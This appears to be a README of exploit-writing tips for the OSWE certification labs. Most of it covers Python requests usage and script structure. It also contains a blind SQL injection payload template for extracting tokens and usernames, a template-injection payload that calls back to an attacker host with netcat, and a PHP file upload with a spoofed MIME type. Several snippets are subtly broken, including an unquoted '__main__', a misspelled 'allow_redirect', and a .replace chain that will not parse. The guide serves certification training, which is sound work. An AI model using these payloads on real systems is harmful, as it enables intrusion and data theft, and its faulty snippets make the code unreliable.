# Exploit-writing for OSWE

## Background

### What

This repository contains a list of useful snippets and tips that pertain to the writing of exploits in the OSWE labs and certification exam.

Some examples here may go against certain coding practices, but our end goal is to write the exploit script fast and correct.

### Why

* While there are many write-ups, reviews, and notes on the certification, few resources specifically focus on the process of writing exploits.
* Writing the exploit script can be daunting, especially for those who are new to Python or have little experience interacting with web applications through code.
* Time spent on identifying vulnerabilities and documenting an exam report can fluctuate considerably, but the time allocated to developing the exploit script can be minimized and kept constant if mastered well.

---


## Table of Contents

<!-- TODO -->

---

## Code Snippets

### Starting Template

```python
import requests

def main():
    print("Hello World!")

if __name__ == __main__:
    main()

```

### Useful imports

```python
# For sending HTTP requests
import requests

# For Base64 encoding/decoding
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode

# For getting current time or for calculating time delays
from time import time

# For regular expressions
import re

# For running shell commands
import subprocess

# For multithreading
from concurrent.futures import ThreadPoolExecutor

# For running a HTTP server
from http.server import HTTPServer, BaseHTTPRequestHandler

# For getting command-line arguments
import sys
```

### Using the `requests` library

#### Sending the simplest HTTP request

```python
resp_obj = requests.get("https://github.com")
```

#### Specifying different HTTP methods

```python
# GET method
requests.get("https://github.com")

# POST method
requests.post("https://github.com")

# PUT method
requests.put("https://github.com")

# PATCH method
requests.patch("https://github.com")

# DELETE method
requests.delete("https://github.com")
```

#### Reading the HTTP response

```python
resp_obj = requests.get("https://github.com")

# HTTP status code (e.g 404, 500, 301)
resp_obj.status_code

# HTTP response headers (e.g Location, Content-Disposition)
resp_obj.headers["Location"]

# Body as bytes
resp_obj.content

# Body as a string
resp_obj.text

# Body as a dictionary (if body is a JSON)
resp_obj.json()
```

#### Sending data as URL parameters (Using `params` argument)

```python
params = {
    "foo": "bar"
}

requests.get("https://github.com", params=params)
```

#### Sending data as a query string in the body (Using `data` argument)

```python
data = {
    "foo": "bar"
}

requests.post("https://github.com", data=data)
```

#### Sending data as a JSON in the body (Using `json` argument)

```python
data = {
    "foo": "bar"
}

requests.post("https://github.com", json=data)
```

#### Sending a file in the body (Using `files` argument)

```python
# (FILE_NAME, FILE_CONTENTS, FILE_MIMETYPE)
files = {
    "uploaded_file": ("phpinfo.php", b"<?php phpinfo() ?>", "application/x-httpd-php")
}

requests.post("https://github.com", files=files)
```

#### Setting HTTP headers (Using `headers` argument)

```python
headers = {
    "X-Forwarded-For": "127.0.0.1"
}

requests.get("https://github.com", headers=headers)
```

#### Setting HTTP cookies (Using `cookies` argument)

```python
cookies = {
    "PHPSESSID": "fakesession"
}

requests.get("https://github.com", cookies=cookies)
```

#### Disabling following of `3XX` redirects (Using `allow_redirects` argument)

```python
requests.post("https://github.com/login", allow_redirects=False)
```

#### Interacting with an unverified HTTPS server (Using `verify` argument)

```python
# Supresses InsecureRequestWarning messages
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

requests.get("https://github.com", verify=False)
```

#### Sending request through a HTTP proxy (Using `proxies` argument)

```python
proxies = {
    "HTTP": "http://127.0.0.1:8080",
    "HTTPS": "http://127.0.0.1:8080"
}

requests.get("https://github.com", proxies=proxies)
```

#### Creating a `Session`

```python
session = requests.Session()
session.get("https://github.com")
```

#### Setting persistent cookies

```python
session = requests.Session()
session.cookies.update({"PHPSESSID": "fakesession"})
```

#### Setting persistent headers

```python
session = requests.Session()
session.headers["Authorization"] = "Basic 123"
```

### Troubleshooting

#### Use Wireshark and filter for HTTP requests

1) Open Wireshark
2) Select the VPN interface (e.g `tun0`)
3) Enter `http` into the filter bar.

#### Print contents of the HTTP request

```python
data = {
    "foo": "bar"
}
resp_obj = requests.post("https://github.com", data=data)
prepared_request = resp_obj.request

print("Method:\n", prepared_request.method)
print()
print("URL:\n", prepared_request.url)
print()
print("Headers:\n", prepared_request.headers)
print()
print("Body:\n", prepared_request.body)
```

#### Proxy HTTP request through Burp Suite and inspect

1) Open Burp Suite
2) Navigate to "Proxy" Tab and set "Intercept" to "On".

---

## Tips

### Perform a sanity check after every HTTP request using `assert`

* Can be used to check if a webshell is indeed uploaded before attempting to trigger it
* Can be used to check if truly authenticated before exploiting authenticated features

Example:
```python
# Suppose 302 is returned if successful login
resp_obj = requests.post("http://example.com/login", data=data, allow_redirect=False)
assert resp_obj.status_code == 302, "Login not successful"

# Suppose admin page is returned if successful login
resp_obj = requests.post("http://example.com/login", data=data)
assert "Admin Dashboard" in resp_obj.content, "Login not successful"
```

### Print meaning messages after each step/request, containing:
* Action being started/finished OR
* Cookies/tokens/files/values that were retrieved

Example:
```
[+] Parsed command-line arguments and got:
  * BASE_URL: http://example.com
  * LHOST:    127.0.0.1
  * LPORT:    1337
[+] Triggered password reset token generation
[=] Getting password reset token length...
[+] Got password reset token length: 10
[=] Retrieving password reset token...
[+] Got password reset token: FAKE_TOKEN
```

### Separate each exploitation step into its own function

Example:
```python
def register():
    pass

def login():
    pass

def rce():
    pass
```

### Create a global `Session` object so it does not need to be explictly passed to each function call

```python
session = requests.Session()

def login():
    session.post(...)

def rce():
    session.post(...)
```

### Create a global `BASE_URL` string and construct the required URLs from it

```python
BASE_URL = ""
session = requests.Session()

def login():
    url = BASE_URL + "/login"
    session.post(url, ...)

def rce():
    url = BASE_URL + "/rce"
    session.post(url, ...)

def main():
    global BASE_URL
    BASE_URL = sys.argv[1]
...
```

### Set the `HTTP_PROXY` / `HTTPS_PROXY` environment variable to force all HTTP requests to go through Burp Suite

```bash
$ HTTP_PROXY=http://127.0.0.1:8080 python3 poc.py
```

### Apply encoding/decoding scheme(s) to enable safe transmission of payloads

* Base64
* Hexadecimal

### Use `"""` to create the payload string if it contains both single (`'`) and double quotes (`"`)

Example:
```python
payload = """This is a '. This is a "."""
```

### Abstract out the injected SQL statement from the SQLi payload

Example:

```python
# SQLi function that accepts arbitrary SQL statement
def sqli(statement):
    payload = f"' or (SELECT CASE WHEN SUBSTRING(({statement}), {idx}, 1)='{letter}' THEN 1 ELSE 0 END)=1 -- "

    # Insert logic that does SQLi magic with above payload to get the result 
    # ...

    return row_result

# Simpler to read
def exfiltrate_token():
    return sqli("select token from tokens LIMIT 1")

# And reuse!
def exfiltrate_username():
    return sqli("select username from users LIMIT 1")
```

### Hardcode an authenticated user's cookie when developing exploits for authenticated features

Especially if a lot of time-consuming steps had to be done to obtain an authenticated user's session

Example:

```python
session = requests.Session()

def main():
    # Skipping these for now...
    # register()
    # login()

    # NOTE2SELF: Remember to delete this line after you are
    # done developing and uncomment the above steps!
    session.cookies["JSESSIONID"] = "ADMIN_COOKIE"

    # Exploit authenticated features...
...
```

### Avoid using f-strings (`f""`) or `str.format` if the payload contains too many curly braces (`{}`)

Doubling each curly brace just to escape them can be troublesome and error-prone. Instead use simple placeholders and do a `.replace()`!

Example:

```python
# Too many curly braces
ssti_payload = f"{{{{ __import__('os').system('nc {LHOST} {LPORT}') }}}}"
# Much easier to read
ssti_payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}"\
    .replace("<LHOST>", LHOST)
    .replace("<LPORT>", LPORT)
```

